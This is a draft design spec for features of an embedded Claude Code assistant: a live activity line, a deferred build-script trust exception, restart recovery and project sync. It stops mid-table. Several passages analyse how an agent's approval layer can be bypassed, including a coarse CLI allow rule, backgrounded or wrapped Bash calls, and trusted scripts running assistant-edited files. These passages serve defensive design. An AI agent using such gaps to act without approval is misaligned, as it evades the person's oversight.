# M81 — Live activity, per-project build-script trust, a restart that always works, and staying in sync

**Status:** DRAFT r5, 2026-10-19; **Feature B explicitly deferred by the owner, not shipping** (see disposition below).
The B sections remain the historical proposed design, not current permission authority. C/A (#173/#176) are merged
in main `5bb43b57`, release pending; D proceeds without B. (r2 added Feature C, from an investigation of the 1.36.0 release; r3 adds Feature
D, approved by the owner the same day). Four owner-approved features (2026-10-19) for the onboard Claude Code
assistant, specified together because all four touch the same machinery: the local-agent session's rule-9 node
(`localAgentSession` / `assistantLoop`), the stream adapter's observation boundary, and the Full-posture
permission layer built in M74. Copied from draft PR #172 at `60f0c877d5474438f21cd8286f1518f68b6cd1c4`;
this revision records the owner's implementation answers and corrects the contradictory stall policy.

**Tracker:** M81 (the next free milestone number: M79 — `spec-first-minute.md` — is the highest in use; no M81 is
taken by any merged spec, open PR or branch as of 2026-10-19). **Builds on:**
[`spec-claude-code-provider.md`](spec-claude-code-provider.md) (M74: posture, the Full folder-trust dialog, the
permission dialog, the `PRE_ALLOWED` grant-free admission pattern, the machine-tier consent rule) and
[`spec-quiet-assistant-panel.md`](spec-quiet-assistant-panel.md) (M78: the quiet panel, `Guide.chipWord`, the
word-and-control budgets, rule 9's "nothing composed in the panel"). **Depends on** the in-flight
`fix/assistant-runs-in-project` branch, which makes the hosted session's working directory the project root — part
B's script resolution is defined relative to that root and is moot (and refused) when no project is open.
CLAUDE.md rules 1, 6, 8 and 9 apply throughout; rule 6 — this spec was written against the live M74 code on
`origin/main`, not inferred from memory.

---

## Current disposition — Feature B deferred

**Owner, 2026-10-19: defer option A; close draft #184 without merging or deleting its branch.** Neither the
original candidate nor its guarded-launch WIP is a shipping feature. Excluding that code preserves existing
Full Bash permission behavior; closing a draft does not change the candidate's runtime behavior to asking.
The historical B requirements and OD-81.3–6 below do not authorise enabling this incomplete exception.

The owner first authorised both root-reset and no-background launch safeguards with explicit opt-in wording,
then a bounded Bash-only helper investigation. Supported hooks report snapshots, not an execution reservation.
Before building a narrower alternative, the owner requested a read-only assessment of an absolute-real-path,
digest-matched single command with every input containing `run_in_background` refused. That variant also fails
the requested execution/foreground guarantee: the documented shell prefix wraps the invocation, persisted shell
setup runs before it, settings can replace inherited environment, and timeout can background a foreground call.
See the [primary-source investigation](../handoff/m81-b-effective-context-investigation.md) and
[final disposition](../handoff/m81-b-deferral.md). No live CLI/model/configuration probe was performed.

Separately, an unchanged wrapper may execute assistant-edited build files, plugins or tests. Identity is not
effect: this residual was already disclosed in the original §2.4/§6, not a newly discovered accidental breach.
The owner now chooses not to grant that broader authority. A future opt-in must honestly say that it lets the
assistant run the project's build without asking, **including assistant edits**, and needs a separate security
review. No such consent or implementation is authorised here. D is independent and proceeds on a safe base
excluding all B production changes.

---

## 1. The problem, with evidence

### 1.1 Feature A — live activity: never wait blind

The owner, 2026-10-19: *"while this is occurring the terminal is just halted, so I can't see Claude's progress… I
can't tell if it has stalled."*

The transcript today (§4.5 of M74) renders two things while a turn is open: provisional text as `stream_event`
deltas arrive, and a tool line once the adapter has enough of a completed `assistant` message block to show it.
Between those two signals there are real, common gaps with **no visible change at all**:

- **A long built-in command.** In the full posture, a `Bash` call such as `./mvnw package` or `./validate.sh`
  produces no `stream_event` of any kind for as long as the child process runs — the CLI's stream-json protocol
  carries control and lifecycle events, never the subprocess's own stdout. A two-minute build leaves the panel
  exactly as it looked at second one.
- **The "thinking" gap.** Between the person's Send and the first `stream_event content_block_delta`, nothing
  renders. For a model that reasons before answering, this gap is routinely tens of seconds.
- **A slow hosted verb.** `analyser_report {bundle}` building a large evidence bundle, or `aggregate` over a rolled
  set, can take real time once admitted; the tool line appears when the model's `assistant` message carries it, and
  nothing updates until the result returns.

M78 (`spec-quiet-assistant-panel.md` §1, §5.2) already measured and fixed the *end-of-turn* chrome (turn time moved
to a tooltip, OD-Q.8) but deliberately said nothing about *during* a turn — its word-and-control budget table pins
"a turn running" at **≤15 words** (§6), which is headroom this spec must fit inside, not reopen.

**What this spec does not change:** when a transcript `Entry` is appended or how it is worded (§4.5, M78 — both
unchanged). This spec adds one new, ephemeral, conditional line — visible only while a turn is open — next to the
existing Stop control, plus a running-totals addition to *About this session…*. Nothing here touches the permanent
transcript.

### 1.2 Feature B — per-project trust for the project's own build scripts

M74 OD-74.16 (`spec-claude-code-provider.md` §5.7) asks the person about **every** `Bash` call in the full posture
under the modes that ask (`default`, `acceptEdits`) — correctly, because record text is attacker-influenced and the
default threat model (§3) assumes a model steered by it. But a project's own build-and-check loop is a fixed, named,
low-variance set of commands the person already reads once in the Full folder-trust dialog (`FullFolderTrust`,
OD-74.12): the tracker's own note on the Haiku trials (M74 ▸ *Skill and system-note guidance*) already flags
build-script commands as the hot path — *"use the project scripts or ask"* is the guidance given to the **model**;
this feature is the matching relief for the **person**, who currently re-approves `./mvnw test` every single time
during an authoring loop (M76's edit-run-explain cycle is exactly this pattern, repeated).

The owner decided **yes** to a narrow, named exception on 2026-10-19. This is a scoped revision of
`spec-claude-code-provider.md` §5.7's *"There is no Always allow"* rule — recorded precisely in §8 below, because
that rule is right for the general case and must keep meaning what it says for everything this feature does not
name.

**The mechanism question, resolved by evidence already in the codebase.** M74 already has exactly this shape of
pre-allow, built and shipped: `LocalAgentPosture.docsFetch` + `LocalAgentAdapter.builtInKind` +
`LocalAgentPermission.onRequested`'s `WEB_FETCH` branch pre-allow a `WebFetch` of one exact documentation host, in
the full posture, **decided entirely by the analyser's own permission layer** — and the code's own comment states
why a CLI `--allowedTools WebFetch(domain:…)` rule was rejected for that case: *"A CLI WebFetch(domain:…) allow runs
before the host callback and checks only the hostname, not the scheme, user info or port."* That is the general
form of the problem this spec's task description names directly: **a CLI `--allowedTools` allow rule bypasses the
analyser's approval bridge entirely** — the 1.36.0 release-review P2 finding, where a hostname-only `WebFetch` allow
skipped the stricter URL check the analyser's own layer applies. Feature B is the same fix pattern applied to
`Bash`: the analyser's permission layer is the authority, so real-path, symlink and argument-syntax checks apply to
every call, not just the ones the CLI's own (coarser) rule syntax happens to catch.

### 1.3 Feature C — restart that always works, and keeps the conversation

From an investigation of release 1.36.0, after a live session got stuck:

- **The Restart-after-exit button carries the same intent as Start** (`LocalAgentPanel.restartAfterExit` →
  `onStart()` → `LocalAgentStartRequested` → `LocalAgentSession.start()`). `start()`'s own first line is:
  `if (running()) { answer(request, true, ""); return changed(); }` — a **silent** no-op whenever `phase` is
  anything but `OFF`. `onStartRequested` is the session's **only** caller of `start()` (confirmed by reading the
  node: `onFolderAnswered` and the restart-offer's *Yes* path call it too, but through the same method), so a
  process stuck in `SPAWNING`, `HANDSHAKE` or `BINDING` — never reaching `READY` and never reaching `OFF` either —
  swallows every further Restart press with no note, no banner, nothing. Live evidence: one restart produced a
  process that never wrote a single transcript entry, and pressing Restart again did nothing visible, because
  `running()` was already (silently, wrongly, from the person's point of view) true.
- **New chat already recovers**, because `onNewChatRequested` calls `kill()` first — but `kill()` is followed by
  `beginConversation()`, which sets `sessionId = null; resumable = false`. So New chat "works" only in the sense
  that it always starts *something*; it always starts a **fresh** conversation, and the person loses whatever
  context they were mid-way through.
- **`spawn()` already resumes correctly whenever `sessionId != null && resumable`** — neither `kill()` nor
  `onExited` clears either field; only `beginConversation()` does. So the fix for "preserve the conversation" is
  narrower than it looks: **don't call `beginConversation()` on a stuck-recovery restart** — call `kill()` alone
  (as `onNewChatRequested` already proves is safe) and let the next `spawn()` resume as it already would.
- **Exit code 143 (`128 + SIGTERM`) can arrive from outside the analyser** — a signal the analyser did not send.
  `onExited` already tells "we asked for it" apart from "we didn't" (`if ("OFF".equals(phase)) { … requested: true
  … } else { … requested: false … reason = "Claude Code exited (code " + e.code() + ")" … }`), but the unrequested
  branch's wording does not say *who* stopped it, only the raw exit code — a person reading *"Claude Code exited
  (code 143)"* has no way to know this was not the analyser's own doing.
- **The usage-limit note is advisory, not a block.** `case RATE_LIMITED -> note("RATE_LIMITED", "Claude Code
  reports a rate or usage limit" + …)` is a transcript note; `startRefusal()` never reads it, and a Start/New chat
  runs normally while it is the most recent note on screen. The wording does not say this, so it reads as if it
  might be blocking.

### 1.5 Feature D — the analyser stays in sync with the project

The owner, while Claude was authoring an existing (non-starter) project: *"keep the analyser up to date so it
syncs with your changes, I don't see the new topology yet."*

**Today, only the starter path watches anything.** `StarterProject` requests
`SessionEffects.WatchStarterGraphmlEffect` once, for the project's *first* build only, watching for any GraphML
under the project root to appear or be rewritten relative to the baseline it took when the watch started
(`MainFrame.watchStarterGraphml`, a polling `javax.swing.Timer` + `GraphmlDiscovery.scan`); it fires
`StarterGraphmlAppeared` on the **first** observed mtime increase — no stability check, so a build's first partial
write can already trigger it — and the watch **ends** once it reports or the project closes. An existing project
that Claude (or the person, in a terminal) regenerates later is never watched at all: the topology, the graph and
the log stay exactly as they were opened until something explicitly calls `open`.

### 1.6 Why these four features belong in one spec

Feature C leans directly on Feature A's machinery: "Claude Code is still starting… 0:12" (requirement 1, §3.4) is
the same `currentStep`/elapsed-clock mechanism §4.1 builds for a running turn, just fed by `spawn()`'s `SPAWNING` /
`HANDSHAKE` / `BINDING` phases instead of an open ticket. Feature D's "the assistant itself caused the change, in
the same turn" (§3.5) reads the very same turn-ticket/admitted-call facts `localAgentPermission` and
`localAgentSession` already publish for Features A and C, to decide *when* to show its offer. Building all four in
one delivery avoids three parallel "something changed" clocks where one set of facts already serves them all.
Feature D touches neither Feature B's code nor its machine-tier trust records.

---

## 2. Goals and non-goals

### 2.1 Goals — A

- A live, updating "current step" line, visible only while a turn is open, naming what the adapter last observed
  (a tool starting, text streaming, or nothing yet) with an elapsed clock once the step has run a few seconds.
- A stall cue after about 60 s with no stream event **and** no pending approval, offering **Keep waiting** / **Stop**,
  never a silent freeze.
- A distinct, unambiguous "needs your approval" state. The existing approval stays application-modal, so no Show
  control is offered behind a dialog that blocks it (owner correction, OD-81.11); never a second dialog.
- Running totals (tool calls, turns, cost so far) in *About this session…*.
- Additive, read-only fields in `context.project.assistant` so an external agent or test can observe the same state
  the panel renders, without parsing words.
- Full rule 9 compliance: the adapter reports observations as facts; `localAgentSession` (reading
  `localAgentPermission`'s published state, as it already does for `chipWord`, M78 §5.1) decides the step, the
  stall verdict and the totals; the panel renders only; elapsed time is derived from fact timestamps plus a
  node-requested tick effect, never a `javax.swing.Timer` the panel owns.
- Fit inside the M78 budgets (§3.6 below gives the arithmetic), not reopen them.

### 2.2 Non-goals — A

- Changing *when* or *how* a transcript `Entry` is written (§1.1).
- A progress bar, percentage, or any claim about how much of a step remains — the adapter cannot know that, and a
  fabricated estimate would be worse than silence.
- Listening for a wire-protocol "heartbeat" from the CLI. Probe before building (§9, OQ-4): nothing in the shipped
  M74 code suggests the stream-json protocol emits a periodic no-op event, so "heartbeat" here is the analyser's own
  tick (§4), not a CLI feature. If a probe finds a real one, prefer it; the design does not depend on it.

### 2.3 Goals — B

- An optional, **unticked by default** choice in the Full folder-trust dialog: *run this project's own build
  scripts without asking*, naming the exact scripts.
- The script list sourced from what the project ships (`TemplateArchive.commandsFor`, its root scripts and the
  Maven/Gradle wrapper) and/or the starter's first-run record — never a free-text or wildcard entry.
- Machine-tier only, keyed by the project's real path — never in a project profile, a `.fluxtion-settings` share, or
  a bundle.
- Shown and revocable in *About this session…*; re-asked when the script set or any trusted script's content
  changes, reusing the digest machinery M74 already built for hooks, MCP servers, `CLAUDE.md` and the other
  instruction files (`FullFolderTrust`).
- Full posture only. Safe analysis and external REST clients are unchanged in every respect.
- Decided by the analyser's own permission layer (`LocalAgentPermission`, mirroring the `WebFetch`/`docsFetch`
  precedent), never by a CLI `--allowedTools Bash(...)` rule.
- Disclosed in the FAQ security answer and `admin/security.md`, pinned by `FaqSecurityContractTest`.

### 2.4 Non-goals — B

- **Not** a general "Always allow" for `Bash`, `Edit`, `Write` or any other built-in tool. The exception is exactly
  one tool (`Bash`), exactly one posture (Full), exactly the named scripts, by real path and content.
- **Not** argument sandboxing. A pre-allowed call's own flags are not inspected for what the *script* might then do
  (§6 states this as a disclosed residual risk, not a gap this spec pretends to close).
- **Not** a live Settings-page toggle in this delivery. The choice is made in the Full folder-trust dialog, at
  Start, the same moment every other full-posture consent is made; see OD-81.5.
- **Not** per-script ticking. One checkbox trusts the whole discovered set together (§3.2); OQ-3 records this as a
  confirmed owner decision (2026-10-19), not a design gap.
- **Not** Windows `.cmd` variants in this delivery (OQ-1) — M74's own Windows acceptance (#148) is still open, and
  POSIX ships first without waiting for #148. Windows shows no script-trust checkbox and keeps asking exactly as
  today. The FAQ/security disclosure links #148; this feature does not close Windows acceptance incidentally.
- **Not** applicable to the default posture: `Bash` does not exist there at all (`BUILT_IN` is denied outright by
  `LocalAgentPermission.policy`, §5.7 table), so there is nothing to pre-allow.

### 2.5 Goals — C

- **Restart is never silent.** Every press of Restart or Start either makes visible progress or names a refusal;
  a stuck generation is stopped first (as New chat already does), then a fresh one starts.
- **Restart preserves the conversation when possible** — it resumes the same Claude Code session id through a
  crash or an external exit; when the CLI cannot resume, it says so plainly, then starts a new chat and places a
  recovery draft (below) rather than losing the person's words silently.
- **A recovery draft after an interrupted turn**, composed by the node from already-recorded facts, placed but
  never sent.
- **Honest wording for exits and limits**: an external kill is named as such; the usage-limit note says plainly
  that it does not block Start.

### 2.6 Non-goals — C

- **Not** a change to when a session is considered `running()` versus `OFF` — the phase machine is unchanged; only
  what `start()` does when it observes each phase changes.
- **Not** a retry policy or an automatic reconnect loop. Every recovery here is still the person's own Restart
  press, or the automatic New-chat-with-recovery-draft fallback that happens when the person's OWN press cannot
  resume — nothing restarts itself in the background unattended.
- **Not** a change to the 5 s/15 s Stop-deadline fallbacks (§4.5 of M74) or the 35 s start deadline — this spec
  makes their OUTCOMES recoverable and honestly worded, not faster or slower.

### 2.7 Goals — D

- **Generalise the starter's one-shot GraphML watch into an ongoing watch of any open, person-owned project**, for
  both its GraphML outputs and its audit-log outputs, for the lifetime of the open project.
- **Offer, never act.** A banner, not a modal (an improvement on today's starter dialog, consistent with M74's
  "a model call never raises a modal", OD-74.13) with **Open** / **Not now**; accepting pairs the new log with the
  regenerated graph through the existing pairing path.
- **Debounced, on a complete file only** — one offer per real change, never one per intermediate write.
- **Correlated with the assistant's own turns** — when the hosted assistant itself produced the change, the offer
  waits for the turn to end rather than interrupting it; in Full, an in-project `open` the assistant already made
  under the existing pre-allow (§4.2's `McpTools.openInProject`, unchanged, OD-74.16) suppresses the redundant
  offer for that same file.
- **Rule 9**: a watcher adapter reports file-system observations as facts; a session node decides whether, when
  and what to offer; the panel renders the banner and nothing else.

### 2.8 Non-goals — D

- **Not** for the sample project or a bundle's working copy — both are analyser-owned scratch roots, never watched
  (§3.5; this falls out of who the node requests the watch for, not a special case in the watcher).
- **Not** an automatic switch of the person's own open log or graph. Acceptance is always the person's own click;
  nothing this feature does ever replaces what is open without it.
- **Not** a new pairing algorithm — Feature D reuses the existing `open {log, graphml}` pairing path (M34)
  unchanged.
- **Not** a new privilege. Nothing here changes what the hosted assistant may open or when (§6 note).

---

## 3. The UX, with wording

### 3.1 Feature A — the live activity line

**Placement.** One conditional line, in the composer area beside Send/Stop, visible **only** while a turn is open
(from the turn's `LocalAgentTurnStarted` to its `LocalAgentTurnEnded`). Nothing is shown when `Ready` — this follows
M78's principle 3 (*"Conditional elements appear only while their condition holds"*) exactly as the restart banner
and the binding chip already do.

**Step wording**, one line, `"<step><space><m:ss>"`, the clock suffix shown only once the step's own elapsed time
reaches **3 s** (so a near-instant `Read` never flickers a `0:00`):

| Observed | Step text | Example |
|---|---|---|
| A `Read`/`Glob`/`Grep` built-in starts | `Reading <name>…` / `Searching…` | *Reading audit.log…* |
| A `Bash` call starts | `Running <command, first line, ≤40 chars>…` | *Running ./mvnw package… 1:42* |
| No tool outstanding, no text yet | `Thinking…` | *Thinking… 0:35* |
| Text is streaming, no tool outstanding | `Answering…` | *Answering…* (no clock while deltas keep resetting it) |
| A hosted verb call is outstanding | `Checking the log…` / `Writing the report…` (from a short, fixed table keyed by verb, never the model's words) | *Writing the report…* |
| A permission request is pending or queued | `Needs your approval — <built-in vocabulary name>`; answer the existing modal | *Needs your approval — Bash* |

`<name>` and `<command, first line>` are **never a raw absolute path or raw record text**: the adapter redacts
paths to their project-relative or base name (the same discipline `FactWords.withoutPaths`/`FactWords.shown`
already apply to permission-dialog words, §5.7) before the words reach the bounded transcript-adjacent store the
activity line reads from; the fact itself carries only a store reference (rule 9, §4.1's *"facts carry ids... never
words"*).

**The stall cue.** When the open ticket's `secondsSinceLastEvent` (§4) reaches **60 s** and no permission request is
pending or queued, the line is joined by a banner, exactly:

> No activity for 1:00 — still working, or stalled? **[Keep waiting]** **[Stop]**

`m:ss` in the sentence tracks the live clock past 1:00 while the banner stays up (it does not freeze at 1:00).
**Keep waiting** dismisses the banner for the current *silence episode* (defined in §4) without stopping anything;
it never reappears on a timer in that same episode. The elapsed clock keeps counting. Only a new stream event
rearms the notice, and only after a further 60 s of silence. **Stop** is the existing Stop fact/effect, unchanged. The banner and the step line coexist: a
genuinely long `./mvnw package` still shows *"Running ./mvnw package… 2:14"* **and** the stall banner once past
60 s — this is deliberate (§4): the two signals answer different questions ("what did we last know was happening"
and "have we heard anything new"), and the owner's own words — *"I can't tell if it has stalled"* — describe
exactly the case where a named, legitimately slow step and a genuinely hung process look identical from the
outside.

**No stall cue while an approval is pending.** The permission dialog (§5.7, unchanged) is itself the positive
signal that something is happening and whose turn it is to act; a redundant "still working or stalled?" on top of
it would read as a second, conflicting question. `approvalPending` suppresses the banner outright, not merely
delays it (★ test, §7).

**Needs your approval, truthfully modal.** While `approvalPending` is true, the step line becomes the approval
cue (table above). The owner explicitly preserves the existing application-modal approval dialog: it blocks native
clicks on the composer, so the cue must not promise a clickable Show action behind it. There is no such control.
The existing `ShowPermissionDialogEffect` performer is idempotent if re-requested internally: it raises the same
dialog, never builds another. This bounded presentation correction supersedes r3's Show affordance, without
changing approval lifetime, supersession, Stop, queuing, deadlines or any permission.

**Running totals.** *⋯ ▸ About this session…* (M78 §4.3, unchanged otherwise) gains one additional line in its
existing session-facts block: *"N tool calls · M turns"* beside the existing cost/plan line. Counts only — no words,
no per-call list (that is the transcript's job).

### 3.2 Feature B — the Full folder-trust dialog

The Full folder-trust dialog (`LocalAgentFolderDialog.content`/`FullFolderTrust.dialogText`, §5.2/OD-74.12,
unchanged in every other respect) gains **one** additional, optional, **unticked by default** line, shown only when
the scanned project root has at least one candidate script (§3.3):

> ☐ **run this project's own build scripts without asking:** `./mvnw`, `./generate.sh`, `./validate.sh`, `./run.sh`
> (and the others in the starter's first-run record)

— the exact script list for *this* project, substituted in place of the example names shown above (which are the
task's own illustrative set — see §3.3 for how the real list is built). Ticking it and pressing **Trust for full
Claude Code** (the dialog's existing default-right/accent-left button pair, unchanged, §5.2) records the whole set
together as one choice (OD-81.5) — there is no per-script tick.

If left unticked, nothing changes: every `Bash` call to these scripts is asked, exactly as it is today.

**Re-ask wording**, reusing `FullFolderTrust.changeNote`'s pattern (prepended the same way, before the rest of the
dialog's unchanged text):

> *"Since you trusted this folder's build scripts, their content changed, or the set of scripts changed (one was
> added or removed); it asks again so you see them."*

**About this session…** gains, only when a project is open and Full is the active posture: *"Project scripts:
trusted (N)"* or *"Project scripts: not trusted"*, with a **Revoke** action when trusted. Revoking takes effect
immediately for the rest of the running session (§4 of `spec-claude-code-provider.md`'s "a settings change while a
session runs" classifies *narrowing* a consent as always safe to apply live, never requiring New chat — this is the
same class of change, extended, OD-81.6): the very next `Bash` call to a previously pre-allowed script is asked
again, with no process restart.

### 3.3 Where the script list comes from

`TrustedProjectScripts.candidates(Path projectRoot)` (new, §4) returns the bare script tokens the project's own
first-run record and root already name — not the full baked-in invocation `TemplateArchive.commandsFor` emits
(`"./mvnw package"`), but the leading token only (`"./mvnw"`), so the person trusts the **program**, and Claude Code
keeps choosing the goal (`test`, `package`, `clean install`, …) per call. A candidate must be:

- present in `TemplateArchive.commandsFor(root)`'s steps, **or** `./mvnw` / `./mvnw.cmd` when the wrapper exists
  (the pre-M19 fallback `commandsFor` already names);
- a path whose **real** path (symlinks resolved) exists, is a regular file, and whose real **parent** is the
  project's own real root — exactly (no subdirectory, no `..`);
- not a directory, not a device file, not something `commandsFor` did not already name (no scanning the whole tree
  for "anything that looks executable" — the source is the starter's own declared steps, never a guess).

Nothing is listed, and the checkbox does not appear, for a project with no such candidates (most hand-written
projects, and any starter that ships no `commandsFor` steps).

### 3.4 Feature C — restart wording

**Restart/Start while genuinely stuck** (`SPAWNING`/`HANDSHAKE`/`BINDING`/`STOPPING` with no progress): the node
kills the stuck generation (preserving `sessionId`/`resumable` — only `kill()`, never `beginConversation()`) and
spawns fresh. While the new attempt is in flight, the **same activity line Feature A builds** (§3.1, §4.1) shows
the step, now also covering the start handshake:

| Phase | Step text |
|---|---|
| `SPAWNING` | `Starting Claude Code…` |
| `HANDSHAKE` | `Checking Claude Code is ready…` |
| `BINDING` | `Connecting to the analyser's tools…` |

— each with the same ≥3 s clock rule as §3.1 (*"Starting Claude Code… 0:12"*).

**Restart while already healthy** (`READY`/`BUSY`): no longer a bare, silent success. The node appends one NOTE,
status `ALREADY_RUNNING`: *"Claude Code is already running."* — visible once, harmless, but never silent.

**Restart that cannot resume.** When the CLI reports the resumed session id is unknown, or the posture/folder
changed since the interrupted session started (the existing `postureRef` mismatch check, §3 of M74), the node says
so plainly: *"This conversation can't be resumed here (the posture or folder changed) — starting a new chat."*,
then runs the New-chat path (`beginConversation()`) itself, and places the recovery draft (below) rather than
leaving an empty composer.

**The recovery draft**, placed unsent in the composer when a new chat starts after an interrupted turn (never when
a resume succeeds normally — then the conversation simply continues):

> *\<the person's own last-sent words, verbatim\>*
>
> *This was interrupted part-way. Check what has already changed before continuing.*

Composed by the node from the ticket's own already-stored send reference (§4.5 of M74: *"the person's own turn is
shown from the analyser's own send record"* — reused here, not duplicated) plus the fixed second line, a constant.
Nothing is sent until the person presses Send.

**Honest exit wording.** `onExited`'s unrequested branch (phase was not already `OFF`) decodes a signal-style exit
code (`128 + N` for a recognised `N`, at minimum 15/SIGTERM and 9/SIGKILL) as:

> *"Claude Code was stopped from outside the analyser (signal 15)."*

falling back to the current *"Claude Code exited (code N)"* for a plain nonzero code (a real crash) or an
unrecognised value. Either way, Restart is offered and resumes per the rules above.

**Honest usage-limit wording.** The `RATE_LIMITED` note gains one clause:

> *"Claude Code reports a rate or usage limit; it resets at \<time\>. This does not block Start or Restart."*

A start that genuinely **fails** because of a limit (an actual `error_max_budget_usd` or an auth/limit error from
the CLI, not merely the advisory note) uses separate, clearly blocking wording — it is a refusal, not a note, and
is said as one (`verdict`/`reason`, not `note(...)`).

### 3.5 Feature D — the sync offer

One of two banners (M78's conditional-banner pattern, never a modal — §2.7), shown only while a project is open
and only for a project the person owns (never the sample, never a bundle's working copy):

> **The graph was regenerated — open it?** **[Open]** **[Not now]**

> **A new audit log was written — open it with the graph?** **[Open]** **[Not now]**

**Open** opens the file and, for the log banner, pairs it with the regenerated graph through the existing
`open {log, graphml}` pairing path (M34) — identical to accepting today's starter offer. **Not now** dismisses
this one offer; the next distinct change raises a new one. While the person's own log is already open, accepting
never auto-switches it without this explicit click — the offer **is** the switch, not a background one.

**Timing around the assistant's own turns.** When the watcher's raw observation and a currently-open hosted turn
overlap (the same `projectGeneration`, an open ticket at the moment the file changed), the node holds the offer
until `LocalAgentTurnEnded` for that ticket, so it never appears mid-answer. If, in the full posture, the assistant
itself already called `open` for that exact path under the existing in-project pre-allow (§4.2,
`McpTools.openInProject`, unchanged — this spec adds no new `open` privilege) within the same turn, the offer for
that file is suppressed outright: it was already opened, and showing "open it?" for a file already open would be
wrong, not just redundant.

---

## 4. The rule-9 node, fact and effect names

### 4.1 Feature A

| Kind | Name | Carries | Raised by / consumed by |
|---|---|---|---|
| Fact (new) | `SessionEvents.LocalAgentToolStarted` | `generation, ticket, callRef, ToolClass toolClass, String name, long wordsRef, long atMillis` | Adapter, on observing a complete `tool_use` content block (before any permission question) → `localAgentSession` |
| Fact (new) | `SessionEvents.LocalAgentToolFinished` | `generation, ticket, callRef, boolean isError, long atMillis` | Adapter, on the matching `tool_result` → `localAgentSession` |
| Fact (existing, reused) | `SessionEvents.LocalAgentTextUpdated` | unchanged | Already resets the "last event" clock; no change to its shape |
| Fact (new) | `SessionEvents.LocalAgentActivityTick` | `generation, ticket, long atMillis` | The analyser's own ticker (the task's "heartbeat" — §2.2 note; not a CLI protocol event) → `localAgentSession` |
| Effect (new) | `SessionEffects.StartActivityClockEffect` | `generation, ticket` | Requested by `localAgentSession` once per open ticket (on `LocalAgentTurnStarted`); the performer schedules ~1 Hz `LocalAgentActivityTick` facts while that ticket is current, and stops on its own once a ticket is no longer current — the same "a late line for an old ticket is refused" rule (§4.5 of M74) applies, so no explicit stop effect is needed |
| Fact (new) | `SessionEvents.LocalAgentActivityAcknowledged` | `generation, ticket` | The person's **Keep waiting** press → `localAgentSession` |
| Effect (existing) | `SessionEffects.ShowPermissionDialogEffect` | unchanged | The permission node's existing modal question; performer is idempotent if internally repeated, with no blocked composer Show action |

**The node.** `localAgentSession` owns `lastEventAtMillis` per open ticket, touched by every fact above except the
tick itself (the tick reads it, never writes it). It derives: `secondsSinceLastEvent = (tickMillis -
lastEventAtMillis) / 1000`; `currentStep` from the most recent `LocalAgentToolStarted`/`Finished`/`TextUpdated`,
falling back to `Thinking…` with no event yet this turn; the *silence episode* as the open interval since
`secondsSinceLastEvent` last crossed from `< 60` to `≥ 60`, cleared by `LocalAgentActivityAcknowledged` or by any
fact that advances `lastEventAtMillis` (a new episode can then start after another 60 s of silence).
`approvalPending` is read from `localAgentPermission`'s already-published pending/queued state (as `chipWord`
already does, M78 §5.1) — `localAgentSession` does not duplicate that decision. The running totals
(`toolCallCount`, `turnCount`) are counters `localAgentSession` increments on `LocalAgentToolStarted` and
`LocalAgentTurnStarted` respectively, reset on New chat.

`LocalAgentState.Guide` gains `currentStep` (String, "" when idle), `secondsSinceLastEvent` (int),
`stalled` (boolean — `secondsSinceLastEvent >= 60 && !approvalPending && !acknowledgedThisEpisode`), and
`toolCallCount`/`turnCount` (int) move from nowhere (they do not exist today) onto `LocalAgentState` itself,
alongside the existing `phase`. The panel renders every one of these; it decides none.

**Implementation representation (rule 9).** The node owns the fixed step template and a `stepWordsRef`; the latter
names only the bounded, redacted argument fragment in the adapter's transcript-adjacent store. `ActivityText.step`
performs pure template substitution, shared by the panel and context, so neither invents step wording and no
model-authored words enter a fact or node state. Totals are exposed by `LocalAgentState` accessors backed by the
same published Guide. An explicit text-progress observation distinguishes real answer text from the existing
`LocalAgentTextUpdated` transcript revisions, which also include tool lines; a finished tool alone never means
the model has started answering.

### 4.2 Feature B

| Kind | Name | Carries | Home |
|---|---|---|---|
| Value class (new) | `TrustedProjectScripts` | `candidates(root)`, `digest(root, scripts)`, `record(realPath, scripts, digest)`, `confirms(records, realPath, scripts, digest)`, `changeNote(records, realPath, scripts, digest)` | `assistant/localagent/`, beside `FullFolderTrust`, same shape (§3.3, §5) |
| Pure check (new) | `LocalAgentPosture.buildScriptInvocation(String command, Path projectRealRoot)` | returns the resolved real `Path` of the invoked script when, and only when, `command` tokenizes as one simple foreground invocation (§6) whose first token's real path exists, is a regular file, and whose real parent equals `projectRealRoot`; else empty | `session/LocalAgentPosture.java`, mirroring `docsFetch`'s shape exactly |
| Adapter classification (extended) | `LocalAgentAdapter.builtInKind` | a new branch: `name.equals("Bash")` → call `buildScriptInvocation`; if present **and** that real path is in this session's captured trusted-script set (from `LaunchSpec`, fixed per session like the posture) → `HostedCallKind.PRE_ALLOWED`; else `CHANGES` (ask, as today) | `assistant/localagent/LocalAgentAdapter.java`, sibling to the existing `WEB_FETCH` branch |
| Fact (existing, extended) | `SessionEvents.LocalAgentConsent` | gains `boolean scriptsPreAllowed` alongside the existing `fullConfirmed`, computed by `LocalAgentConsents.of` the same way (`TrustedProjectScripts.confirms(s.trustedScripts(), real, candidates, digest)`) | `assistant/localagent/LocalAgentConsents.java` |
| Node decision (extended) | `LocalAgentPermission.onRequested` | a new branch, sibling to the existing `WEB_FETCH` one: `cls == BUILT_IN && "Bash".equals(name) && kind == PRE_ALLOWED && posture.isFull() && scriptsPreAllowed && <live re-check, below>` → `allowWithoutAsking(..., PermissionBy.PRE_ALLOWED)`; otherwise falls through to the unchanged `BUILT_IN`/full-posture ask path | `session/node/LocalAgentPermission.java` |
| Settings (new, machine-tier) | `assistant.claudeCode.trustedScripts` | a list of `TrustedProjectScripts.record(...)` strings, read/written by `ConfigStore` exactly as `assistant.claudeCode.trustedFull` is (`readList`/`writeList`), and added to `LocalAgentConsents.Settings` as `trustedScripts` | `config/ConfigStore.java`, `assistant/localagent/LocalAgentConsents.java` |

**The live re-check (defense in depth, the established pattern).** `LocalAgentAdapter.builtInKind` classifies from
the session's **launch-time** snapshot of the trusted set (fixed per session, exactly as `postureRef` fixes the
posture — a mid-session settings change narrows live, §3.2, but never *widens* a running session without New chat,
consistent with "a posture change needs New chat", §3 of M74). `LocalAgentPermission`, before calling
`allowWithoutAsking`, **re-reads the resolved script's current bytes** and recomputes its digest — not trusting
the adapter's classification alone — exactly mirroring OD-74.12's "the spawn re-checks the folder's whole trust
digest again" and the dual adapter/server judgement `McpTools.openInProject`/`reportInProject` already use for
hosted verbs. A mismatch denies (asks), once, and flags the folder for a re-ask dialog next Start.

### 4.3 Feature C

No new fact *types* — the fix is entirely in what `LocalAgentSession.start()` and two existing handlers do with
facts they already receive:

| Where | Change |
|---|---|
